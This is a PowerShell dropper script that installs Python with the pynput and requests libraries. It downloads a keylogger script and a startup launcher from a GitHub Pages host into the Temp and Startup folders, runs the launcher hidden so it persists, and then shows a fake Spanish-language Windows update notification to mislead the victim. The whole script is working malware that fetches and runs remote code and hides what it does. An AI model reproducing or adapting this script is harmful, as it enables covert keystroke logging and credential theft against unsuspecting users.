# Check if Python is installed
$pythonCheck = python --version 2>$null
if ($?) {
    Write-Host "Python is already installed. Version: $pythonCheck"
} else {
    Write-Host "Python not found. Downloading and installing..."

    # Define Python version and download URL
    $pythonVersion = "3.12.1"
    $pythonInstaller = "python-installer.exe"
    $downloadUrl = "https://www.python.org/ftp/python/$pythonVersion/python-$pythonVersion-amd64.exe"

    # Download Python installer
    Invoke-WebRequest -Uri $downloadUrl -OutFile $pythonInstaller

    # Install Python for the current user (no admin rights needed)
    Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -NoNewWindow -Wait

    # Cleanup installer
    Remove-Item $pythonInstaller -Force

    # Verify installation
    $pythonCheck = python --version 2>$null
    if ($?) {
        Write-Host "Python installed successfully! Version: $pythonCheck"
    } else {
        Write-Host "Installation failed. Please install manually."
        exit 1
    }
}

# Ensure pip is installed and upgraded
Write-Host "Upgrading pip..."
python -m ensurepip --default-pip
python -m pip install --upgrade pip

# Install pynput library
$library = "pynput"
Write-Host "Installing Python library: $library..."
python -m pip install --user $library

# Install requests library
$library = "requests"
Write-Host "Installing Python library: $library..."
python -m pip install --user $library

# Verify installation
$libCheck = python -c "import $library; print('$library installed successfully!')" 2>$null
if ($?) {
    Write-Host $libCheck
} else {
    Write-Host "Failed to install $library. Try installing it manually."
}

# Download all the necessary files from GitHub

# Define StartUp directory (expand %APPDATA% path)
$StartDir = [System.Environment]::GetFolderPath('ApplicationData') + "\Microsoft\Windows\Start Menu\Programs\Startup\RUN.cmd"

# Define URL of the startup script
$StartUrl = "https://mynewaccount-website.github.io/keylogger/RUN.cmd"

# Download the script to StartUp directory
Invoke-WebRequest -Uri $StartUrl -OutFile $StartDir

# Define Temp directory for Python script
$PythonPath = Join-Path $env:TEMP "keylogger.py"

# Define URL of the Python script
$PythonUrl = "https://mynewaccount-website.github.io/keylogger/keylogger.py"

# Download the Python script
Invoke-WebRequest -Uri $PythonUrl -OutFile $PythonPath

# Opening "RUN.cmd" file in startup
Start-Process -FilePath "$StartDir" -WindowStyle Hidden

# Run notification
$title = 'Sistema operativo Windows'
$message = 'La nueva actualizacion esta lista para descargar.'
$duration = 5000

Add-Type -AssemblyName System.Windows.Forms

$notify = New-Object System.Windows.Forms.NotifyIcon
$notify.Icon = [System.Drawing.SystemIcons]::Information
$notify.BalloonTipTitle = $title
$notify.BalloonTipText = $message
$notify.Visible = $true
$notify.ShowBalloonTip($duration)

Start-Sleep -Seconds ([math]::Ceiling($duration / 1000))

$notify.Dispose()
exit
